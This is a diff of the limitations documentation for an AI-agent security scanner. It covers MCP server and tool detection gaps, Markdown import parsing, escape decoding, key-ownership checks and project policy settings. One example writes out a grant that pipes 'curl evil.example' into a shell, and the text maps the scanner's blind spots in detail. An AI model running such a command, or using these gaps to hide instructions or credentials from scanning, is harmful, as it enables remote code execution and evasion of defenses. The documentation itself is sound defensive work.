@@ -432,9 +432,10 @@ A way around a limit that its entry does not describe is worth a
   by its shape or in a `NAME=value`, `--name=value` or `--name value` word, which
   covers cmd's `set NAME=<scheme> <credential>`.
 - **`credential_exposure` reports a precise subset of what is scrubbed.** The scrubber
-  redacts broadly on purpose; the finding is raised only for an MCP server's `env`
-  values, launch arguments, header values and endpoint URL query, and for an `env` or
-  header name in a known token shape. A credential in the `command` field itself, in
+  redacts broadly. The registry collector reports credential-shaped names, extras,
+  versions, environment markers and selected lockfile evidence. The MCP collector reports
+  literal credentials in server environment values, launch arguments, headers and endpoint
+  URL queries, and recognized token shapes in environment or header names. A credential in the `command` field itself, in
   an `oauth` or `auth` object, in a Claude Code settings `env` value, or in an A2A or
   RAG header is scrubbed or withheld as before but raises no `credential_exposure`
   finding. A password in an endpoint URL's user information stays with
@@ -516,7 +517,8 @@ A way around a limit that its entry does not describe is worth a
   `--package=srv@1.2.3 -- srv` skips this lookup, though not the `node_modules` one.
 - **Servers started from code are gaps, not records.** Application code that starts
   or reaches a server leaves no component for it, only a gap that fails the default
-  gates: in Python, `StdioServerParameters`, `sse_client`, `streamablehttp_client` and
+  gates: in Python, `StdioServerParameters`, `stdio_client` (whatever parameters it is
+  given), `sse_client`, `streamablehttp_client`, `streamable_http_client` and
   `websocket_client` of the MCP SDK, `MCPServerStdio`, `MCPServerSse` and
   `MCPServerStreamableHttp` of the OpenAI Agents SDK, `MCPServerStdio`,
   `MCPServerSSE`, `MCPServerHTTP` and `MCPServerStreamableHTTP` of PydanticAI, and
@@ -632,7 +634,9 @@ A way around a limit that its entry does not describe is worth a
   from `mcp.server`, `mcp.server.fastmcp`, `mcp.server.fastmcp.server`, `fastmcp`,
   `fastmcp.server` or `fastmcp.server.server`, and from `MCPServer` imported from
   `mcp.server.mcpserver`. Forms the collector recognizes but cannot follow are
-  gaps: the low-level `Server`, a constructor given `tools=`, `tool_serializer=`,
+  gaps: the low-level `Server`, by any import of `mcp.server.lowlevel`, of `Server`,
+  `lowlevel` or `*` from `mcp.server`, or any attribute path to them from `mcp` or
+  `mcp.server`, a constructor given `tools=`, `tool_serializer=`,
   `providers=`, `mount=`, `lifespan=`, `middleware=`, `tool_transformations=`,
   `transforms=`, `extensions=`, `resources=`, `**` arguments, or more positional
   arguments than the name and instructions (seven for `FastMCP` from `mcp.server` or
@@ -662,7 +666,9 @@ A way around a limit that its entry does not describe is worth a
   `title`, `description`, `tags`, `annotations`, `output_schema`, `exclude_args`,
   `meta`, `structured_output`, `icons`, `enabled`, `version`, `app`, `task`,
   `timeout`, `auth` and `run_in_thread`, is an unresolved tool name gap,
-  because `fastmcp` also takes the name as `name_or_fn`. A tool given `enabled=False`
+  because `fastmcp` also takes the name as `name_or_fn`. So is a registration with any
+  other decorator below it, which hands the registration whatever function, name and
+  signature it returns. A tool given `enabled=False`
   is still inventoried.
   Besides its `tool` decorator on a module-level function, which is inventoried, a
   server may be used without a gap only in these ways: reading its `name`,
@@ -752,11 +758,15 @@ A way around a limit that its entry does not describe is worth a
   the server) passed to code the collector does not read, an SDK module object
   passed to code the collector does not read, or a context reached by reflection in a file that
   names no MCP SDK or framework, which is not read, is not seen. A type in an annotation is the whole annotation,
-  a member of a `|` union, or an argument of a generic of `typing`,
-  `typing_extensions` or `collections.abc`, such as `Optional[FastMCP]`, or of a
-  built-in generic such as `list[FastMCP]`. Any other part of an annotation, such
-  as a call or another subscript, is analyzed as code, because annotations are
-  evaluated. So is a string literal wherever `typing.get_type_hints` and the SDKs
+  a member of a `|` union whose members are all type syntax (constants, names of
+  `typing`, of builtin classes or of classes imported from an SDK or framework
+  package, and subscripts and unions of those), or an argument of a generic of
+  `typing`, `typing_extensions` or `collections.abc`, such as `Optional[FastMCP]`, of
+  a built-in generic such as `list[FastMCP]`, or of an SDK class such as
+  `Context[...]`. Any other part of an annotation, such as a call, a walrus, another
+  subscript or both members of `Context | helper.steal`, is analyzed as code,
+  because annotations are evaluated, with or without `from __future__ import
+  annotations`, and evaluating `A | B` hands each member to the other. So is a string literal wherever `typing.get_type_hints` and the SDKs
   evaluate it as a forward reference: the whole annotation, a member of a `|` union,
   an element of a tuple or list, or an argument of any subscript, since a generic
   defined anywhere turns a string argument into a forward reference. The arguments of
@@ -817,7 +827,11 @@ A way around a limit that its entry does not describe is worth a
   position, a keyword or an element of a list, tuple, set or dict argument, also
   behind `*` or `**`, so `functools.partial`, `map` and a thread target's `args` or
   `kwargs` are covered too. A call to another
-  function with such a literal is a gap as well, except `logging.getLogger`, a
+  function with such a literal is a gap as well, except `logging.getLogger` while
+  `logging` can only be the standard library's (bound only by `import logging`, read
+  only for plain attributes, none of them stored, and no star import from another
+  module, `globals`, `vars`, `setattr` or similar in the file), `getLogger` imported
+  from `logging` and bound no other way, a
   server class imported from its own module, such as `FastMCP("mcp")`, and the
   attribute name of an unshadowed `getattr` call, such as `getattr(ns, "mcp")`. A literal is a string or an
   f-string without placeholders. A dynamic import (`importlib.import_module`,
@@ -884,8 +898,15 @@ A way around a limit that its entry does not describe is worth a
   decorated with `@tool` (LangChain, CrewAI, smolagents), `@function_tool` (OpenAI
   Agents SDK) or PydanticAI's `@agent.tool` are collected by name; the descriptor is
   not. A decorated function that is not at module level, a rebound decorator, a
-  qualified import and a star import are gaps. So is a PydanticAI agent given `tools=`,
-  `toolsets=`, `builtin_tools=`, `mcp_servers=` or `*` or `**` arguments, or used
+  decorator below the registration, a qualified import and a star import are gaps. So
+  is an import from `agents`, `pydantic_ai`, `langchain_core.tools`, `langchain.tools`,
+  `crewai.tools` or `smolagents`, or a submodule of one, other than an `mcp` client
+  module, of a name the collector does not read tools from that is a submodule or
+  function, such as `from agents import tool`, or a tool or toolset class, unless it is
+  only used as a type in annotations. `tool` is also read from
+  `langchain_core.tools.convert` and `crewai.tools.base_tool`. So is a PydanticAI
+  agent given `tools=`, `toolsets=`, `builtin_tools=`, `mcp_servers=`,
+  `prepare_tools=`, `prepare_output_tools=` or `*` or `**` arguments, or used
   other than through its `tool` and `tool_plain` decorators, reading its `name`,
   calling `run`, `run_sync`, `run_stream` or `iter` and using the result anywhere,
   also inside a `try` statement, applying its `system_prompt`, `instructions` or
@@ -896,8 +917,8 @@ A way around a limit that its entry does not describe is worth a
   `with agent as alias`, and the reflection listed under **Python server forms**
   are gaps. Each agent's tools are named per agent, so two agents
   of a file can each have a tool of the same name. Class-based tools, such as
-  `BaseTool` subclasses and `StructuredTool.from_function`, are neither collected
-  nor reported.
+  `BaseTool` subclasses and `StructuredTool.from_function`, are not collected; the
+  import of the class is the gap.
 - **Tool definitions are fingerprinted only when declared or observed.** A static
   scan fingerprints the tools in a server's `tools` array, a Nexus SymBiote
   convention that MCP clients do not write. Tools in server source are recorded by
@@ -1115,10 +1136,17 @@ A way around a limit that its entry does not describe is worth a
   resolved from that file's directory. The imports of other instruction files, such
   as `AGENTS.md` or a rule file, are followed only when a memory file imports them.
   Imports are read from the text outside fenced code and code spans as CommonMark
-  reads it, across lines and inside block quotes and list items. Where CommonMark
-  readers disagree, as after a link reference definition or inside raw HTML, the
-  text is searched as written, so more is looked up; a host that reads Markdown
-  otherwise, such as with GitHub's table or autolink extensions, can still import a
+  reads it, across lines and inside block quotes and list items. When the only
+  disagreement is the start of an HTML block, the scanner follows imports from
+  either complete reading. For example, cmark-gfm 0.29 parses the line after
+  `<search>notes</search>` as prose when there is no intervening blank line.
+  A closing code span there can expose an import. Readers that treat `search`
+  as a block tag keep the same line in raw HTML. A fenced example that both
+  readers recognize stays an example. Other ambiguities, including footnotes followed by a setext heading
+  underline, also retain the raw text and container and inline-code boundaries.
+  In that case a fenced example such as `@../notes.md` can count as an import and
+  cause `scan --check` to fail.
+  A host using GitHub's table or autolink extensions can still import a
   file from text read here as code.
   A reference is read only where `@` starts the text or follows white space, and
   without the sentence punctuation after it. A host that also starts a reference
@@ -1221,9 +1249,11 @@ A way around a limit that its entry does not describe is worth a
   zero-width or bidirectional characters each separated by another byte, plane-14
   characters spread so that no 4,096 characters hold 16 of them, and a UTF-16 or
   UTF-32 file without a byte-order mark.
-- **Escapes are decoded only in prompt templates.** A JSON, YAML or TOML prompt
-  template, under a `prompts` directory or named `*.prompt.yaml` or `*.prompt.yml`,
-  and the YAML front matter of a Markdown one, is checked in what it decodes to as
+- **Escapes are decoded only in prompt templates and front matter.** A JSON, YAML or
+  TOML prompt template, under a `prompts` directory or named `*.prompt.yaml` or
+  `*.prompt.yml`, and the front matter of every Markdown instruction file, prompt
+  template and skill or command declaration, YAML unless its opening line names
+  `toml` or `json` (`---yaml`, `--- toml`), is checked in what it decodes to as
   well as in its raw text, also when a memory file imports it, so a hidden character
   written as an escape, such as `\udb40\udc49` in JSON or `"\U000E0049"` in YAML or
   TOML, is the same finding as one written raw. YAML of at most 20,000 parser events
@@ -1233,15 +1263,19 @@ A way around a limit that its entry does not describe is worth a
   comments, duplicate keys, large numbers or lone surrogates, and YAML or TOML that
   does not parse or is past those bounds, have each escape that an odd run of
   backslashes starts decoded by pattern: `\x`, `\u` and `\U` with their hexadecimal
-  digits, YAML's `\L`, `\P`, `\N` and `\_`, and `\e`. The pattern also decodes such
+  digits, YAML's `\L`, `\P`, `\N` and `\_`, and `\e`, and a backslash that ends a
+  line is removed with the line break and the indentation after it, as YAML and TOML
+  continue a string there, so an escaped surrogate pair split across lines is joined.
+  YAML or TOML decoded by pattern is a coverage gap, since the pattern can still read
+  an escape otherwise than a host does. The pattern also decodes such
   an escape in a YAML or TOML literal string or comment, which a host keeps as text,
   so it can only add findings, which may be false positives: in a Jinja-templated
   YAML file, or front matter that does not parse, a single-quoted Windows path or
   regular expression, such as `'C:\Logs\Pipeline'` (`\L` and `\P`, U+2028 and
   U+2029) or `'\P{L}+'` (`\P`, U+2029), is a low `line_separators` finding, while the
   same lines in YAML that parses give none. A character the file holds raw in a comment
-  and also spells in a parsed string is counted once. The same file in a rule, prompt,
-  subagent, skill or command
+  and also spells in a parsed string is counted once. A JSON, YAML or TOML file in a
+  rule, prompt, subagent, skill or command
   directory, or imported with `@path` from outside a `prompts` directory, is checked
   as raw text only, as are a Markdown body and templates in other formats, such as
   Jinja's `{{ "\u202e" }}`, which only rendering decodes.
@@ -1257,7 +1291,12 @@ A way around a limit that its entry does not describe is worth a
   forms that HTML parsers read as comments (`<! ...>`, `</ ...>`) in HTML blocks, link
   reference definitions that no link uses or that repeat a label, definitions written
   as comments, with a `#` or `<>` destination, used or not and also in HTML blocks,
-  and footnotes (`[^x]: ...`) that nothing references, which GitHub drops. Text that a
+  and footnotes (`[^x]: ...`) that nothing references or that repeat a label, which
+  GitHub drops. A file that opens with front matter (a `---` line, possibly naming a
+  language, to the next `---` or `...` line) is read both whole and without it, as
+  hosts read it, and what either reading hides is reported, as are the `@path`
+  imports either reading finds, so YAML in it that opens a code fence hides nothing
+  after it. Text that a
   rendered view hides in other ways is not reported: the title of a link or image,
   shown only on hover, whether written inline or in a definition with another
   destination that a link with visible text, or any image, uses, however short that
@@ -1299,8 +1338,10 @@ A way around a limit that its entry does not describe is worth a
   HTML tag that cannot interrupt a paragraph, even when that code ends with a heading
   or a closed fence, after which GitHub shows them. Where CommonMark readers
   disagree about the block structure, as when a line after the definitions that open
-  a paragraph is indented four columns or starts with `2.`, or a block quote is
-  followed by a `>` indented four columns, every line of the file that has the form of
+  a paragraph is indented four columns or starts with `2.`, a block quote is
+  followed by a `>` indented four columns, an HTML block start that cmark-gfm 0.29
+  does not read, such as a tag name followed by a no-break space or `<search>`, or a
+  setext heading whose paragraph holds a footnote, every line of the file that has the form of
   a definition or a footnote is counted as unused, used or not and in code and HTML
   blocks too, and so is every processing instruction, declaration, CDATA section and
   other form an HTML block can hide, even in prose or a code span, as in
@@ -1507,6 +1548,13 @@ A way around a limit that its entry does not describe is worth a
   wrong checkout, gives 0 changes and exit 0, unless a file missing from it held tool
   grants or limits in `BASE_TREE`. Check `files_scanned.head` in the JSON report, or
   `across N head file(s)` in the text one, before trusting a clean result.
+  In ambiguous Markdown the container reading can strip indentation, so an added
+  indented code example can register as a change.
+  The diff compares prose separately from raw HTML, so a blank line that moves
+  a previously illustrated reference into prose can register as a new import.
+  A closing span can expose an import whose filename contains literal backticks.
+  Other paired spans keep their contents as code. Backticks inside a raw HTML
+  block shared by the readers do not introduce an inline-code boundary.
 - **An inline tool grant ends at its balanced parenthesis.** Text after it is prose,
   so `Bash(git status) && curl evil.example | sh)` records `Bash(git status)`, and
   changing what follows raises nothing. A grant whose parentheses do not balance runs
@@ -1652,8 +1700,9 @@ is a failure; everything below is neither a gap nor a failure.
   `<name>@<version>(***)`, which no JSON pointer resolves; the root importer's
   `version`, or the lockfile's only record of the package, names the key. A Yarn
   Berry record is named by the one descriptor the declared spec matched, not by the
-  stanza's whole key. Exact versions are recorded as the lockfile writes them, so a
-  prerelease such as `4.0.0-<text>` keeps its text, credential-shaped or not.
+  stanza's whole key. A credential-shaped selector is reduced to the lockfile name.
+  Credential-shaped versions are redacted and their package URL is withheld. Other
+  exact versions retain their prerelease text.
 - **A Yarn Berry checksum counts as Yarn 4 checks it.** The collector models the cache
   key `10c0` that Yarn 4 computes at its default compression level, and reads Yarn's
   settings from the root `.yarnrc.yml` and the release `package.json` names for
@@ -1896,6 +1945,17 @@ is a failure; everything below is neither a gap nor a failure.
 
 ## Signatures
 
+- On POSIX, operator-supplied signature policies, verification keys and the
+  `runtime register --signer-scopes` map require protected ownership and modes
+  throughout their directory ancestry. A 002 umask can produce a 0664 file or
+  0775 directory. A read-only file on a 2775 Kubernetes `fsGroup` volume can
+  still be replaced by another group member. Remove group write from paths you
+  control or provision the inputs in a private directory. Use a 022 umask for
+  new files. In Action container jobs, provision the original signer policy and
+  trusted keys in a directory owned by the container account or root when the
+  host owns `runner.temp`. The Action skips checkout directories when choosing
+  a trusted location for its private snapshot.
+
 - **The CLI checks the cache before trusting it.** Offline verification uses the trusted root
   that sigstore-python caches in `$XDG_CACHE_HOME/sigstore-python` when
   `XDG_CACHE_HOME` is set, and otherwise in `~/.cache/sigstore-python` on Linux or
@@ -1939,9 +1999,11 @@ is a failure; everything below is neither a gap nor a failure.
 - **The trusted-key placement check is a heuristic.** It refuses a key inside a git
   working tree that holds the subject, the envelope or the current directory, also
   under another name for that tree directory, and a key file with other hard links.
-  It does not authenticate a key, check its owner or permissions, recognize a
-  checkout without a `.git` entry, or follow a key copied or mounted out of the
-  checkout, such as one reached through `docker run -v "$PWD/keys:/keys"`.
+  It does not authenticate a key, recognize a checkout without a `.git` entry
+  unless that checkout is the project an operator policy is checked against, or
+  follow a key copied or mounted out of the checkout, such as one reached through
+  `docker run -v "$PWD/keys:/keys"`. The owner and mode checks on the key and the
+  directories above it say only that no other user can replace it.
 - **Verification and use are separate reads.** Run `verify-attestation` and `diff`
   where the change under review cannot write between the two.
 - **The verifying build must read the inventory's format.** An attestation of a
@@ -2023,15 +2085,12 @@ is a failure; everything below is neither a gap nor a failure.
   although nothing about its MCP servers was verified. Without a signer policy,
   passing integrity shows only that the inventory matches the checkout. The
   [roadmap](../ROADMAP.md#plan) tracks the change (N12).
-- **A project policy can weaken its own gate.** `scan`, and `validate` and `risk`
-  with `--project`, apply the checkout's `.nexus-symbiote.yaml`, including
-  suppressions, ignored categories and raised thresholds. Each relaxation is listed
-  in `policy_weakened`, in the inventory's metadata and in `risk --json-output`, and
-  printed as a warning. When a CI variable such as `CI` or `GITHUB_ACTIONS` is set, a
-  policy that weakens a gate fails the command unless `--no-project-policy` ignores it
-  or `--accept-project-policy` accepts it explicitly; interactive runs only warn. There
-  is no operator-owned policy file. See
-  [what `policy_weakened` reports](policy-reference.md#what-policy_weakened-reports).
+- **A checkout can tighten its own gates.** `scan`, `baseline`, and `validate`
+  or `risk` with `--project` apply the tightening settings in a valid policy automatically. The CLI
+  warns and withholds requested relaxations and output changes until the
+  operator passes `--accept-project-policy`. The
+  Action and the pre-commit hooks pass `--no-project-policy`. A signed operator
+  policy bounds the result. See [policy reference](policy-reference.md).
 - **A suppressed chat template finding is bound to the model file.** A suppression
   names the [fingerprint](policy-reference.md#suppressions) of the finding, which
   binds the model's own content digest, the `sha256` of its file, not the chat
@@ -2282,8 +2341,10 @@ is a failure; everything below is neither a gap nor a failure.
 - **The runtime key placement check is a heuristic.** `runtime verify` and
   `runtime register` refuse a public key inside a git working tree that holds an input
   file or the current directory, and a key file with other hard links, as
-  `verify-attestation` does. The check does not authenticate a key or check its owner,
-  and a key copied or mounted out of the checkout is accepted; a registrar given such a
+  `verify-attestation` does, and a key file that another user could replace, by the
+  [trusted keys](inventory-attestation.md#trusted-keys) ownership rule. The check does
+  not authenticate a key, and a key copied or mounted out of the checkout is accepted;
+  a registrar given such a
   key can still record an attacker's serial, which only deleting rows undoes. Python
   callers of `ReferenceGateway` pass key objects and get no placement check. The
   hard-link rule does not look at where the other names are, so a key in a store that
